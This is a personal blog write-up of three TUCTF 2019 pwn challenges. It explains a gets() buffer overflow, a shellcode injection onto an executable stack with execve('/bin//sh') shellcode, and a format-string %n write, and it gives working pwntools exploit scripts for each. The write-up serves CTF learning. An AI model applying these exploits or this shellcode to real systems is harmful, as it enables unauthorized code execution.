---
# Documentation: https://sourcethemes.com/academic/docs/managing-content/

title: "TUCTF 2019 - Pwn Challenges"
author: "Shreyansh Singh"
date: 2019-12-02T19:39:57+05:30
lastmod: 2019-12-02T19:39:57+05:30
featured: false
draft: false

description: ""

subtitle: "My writeups for some of the PWN challenges of TUCTF 2019."

tags: [ctf, information security, infosec, writeups]
categories: [Information Security]


# Featured image
# To use, add an image named `featured.jpg/png` to your page's folder.
# Focal points: Smart, Center, TopLeft, Top, TopRight, Left, Right, BottomLeft, Bottom, BottomRight.
image:
  caption: "TU CTF 2019"
  focal_point: ""
  preview_only: false

# Projects (optional).
#   Associate this post with one or more of your projects.
#   Simply enter your project's folder or file name without extension.
#   E.g. `projects = ["internal-project"]` references `content/project/deep-learning/index.md`.
#   Otherwise, set `projects = []`.
projects: []
---


I couldn't give much time to the CTF because of some college work, but I gave a shot at the PWN challenges. The challenges became offline later but I still decided to work on the exploit scripts to make them work locally.

---

## thefirst - 379 pts

We can see in the image below that `gets` is being used to take the input. Hence it can be exploited for _buffer overflow_. First, using GDB (with GEF), we find that the offset required to overflow the buffer is 24.

{{< figure src="/post/2019-12-02_tuctf-pwn-2019/images/thefirst_1.png" caption="Disassembly of main" >}}

This can be done using `pattern create 50` and then using that pattern to find the crash offset.

{{< figure src="/post/2019-12-02_tuctf-pwn-2019/images/gef_1.png" >}}

{{< figure src="/post/2019-12-02_tuctf-pwn-2019/images/gef_2.png" >}}

Also inspecting the functions, we see that there is a `printFlag` function at 0x80491f6. So, our objective is to jump there.

The following script is the exploit.

```python
from pwn import *

p = process("./thefirst")
# p = remote("chal.tuctf.com", 30508)
print_flag_addr = 0x80491f6
offset = 20

payload = "A"*offset
payload += "BBBB"
payload += p32(print_flag_addr)

f = open('payload', 'wb')
f.write(payload)
f.close()

p.recvuntil('> ')
p.sendline(payload)

p.interactive()
```

---

## shellme32 - 462 pts

On running the program, we are given an address and we have to provide some input. On analysing it using GDB, and using `vmmap`, we find that the adress given to us is that of the stack and the stack is read, write and executable. 

{{< figure src="/post/2019-12-02_tuctf-pwn-2019/images/shellme32_1.png" >}}

We use [shell-storm](http://shell-storm.org/shellcode/files/shellcode-811.php) to get the shellcode. First we get the offset of the crash like before. In the script below, we use the shellcode, pad it with 'A's and then provide the address to write to, i.e. the adress provided to us.

```python
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
len_shell_code = 28

from pwn import *
# context.log_level = 'debug'
p = process("./shellme32")

offset = 40


p.recvuntil('?\n')
addr = int(p.recvline().strip(), 16)
p.recvuntil('> ')

log.info('Stack Address: ' + str(hex(addr)))

payload = shellcode
payload += "A"*(offset - len_shell_code)

payload += p32(addr)

print(len(shellcode))
p.sendline(payload)

with open('payload', 'wb') as f:
    f.write(payload)

p.interactive()
```

---

## printfun - 500 pts

Here, on analysing with Ghidra, we find that there is a format string vulnerability.

{{< figure src="/post/2019-12-02_tuctf-pwn-2019/images/printfun_1.png" >}}

So, here first we use GDB to get the addresses of the two buffers being compared. Also, as input if we provide `"%x %x %x %x %x %x %x %x %x %x %x %x %x %x"`, for the instance running on GDB we get this output -

`5655a050 3c 14 1 ffffc994 5655a050 5655a008 ffffc900 0 0 f7e06637 f7fa0000 f7fa0000 0`

On seeing the values displayed by GDB, we see two addresses - `0x5655a008` and `0x5655a050`

{{< figure src="/post/2019-12-02_tuctf-pwn-2019/images/printfun_2.png" >}}

This is intereting as both these addresses are also present in the program's output with our input.

So, all we have to do is overwrite the 6th and 7th "addresses" of the output to the same value so that the string comparison passes.

We write the following exploit code, which works locally. I hope it would work remotely as well (but no way to test it now :frowning_face:) -

```python
from pwn import *

p = process("printfun")

payload = "AAAA%6$n%7$n"

p.sendlineafter('? ', payload)

p.interactive()
```

That's all for now :wave:.

I'm working on a few more of the PWN challenges and also on the REV ones which I found very interesting. Will be posting their writeups too.